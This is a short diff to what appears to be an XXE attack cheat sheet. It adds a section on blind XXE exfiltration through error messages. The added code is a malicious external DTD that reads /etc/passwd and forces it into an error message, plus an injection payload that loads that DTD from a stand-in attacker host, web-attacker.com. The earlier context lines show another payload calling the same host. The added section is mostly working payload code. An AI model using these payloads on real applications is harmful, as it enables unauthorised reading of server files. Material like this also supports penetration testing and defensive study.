@@ -130,3 +130,17 @@ XXE payload to the vulnerable application:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
+
+### Exploiting blind XXE to retrieve data via error messages
+malicious external DTD:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+XXE payload to the vulnerable application:
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
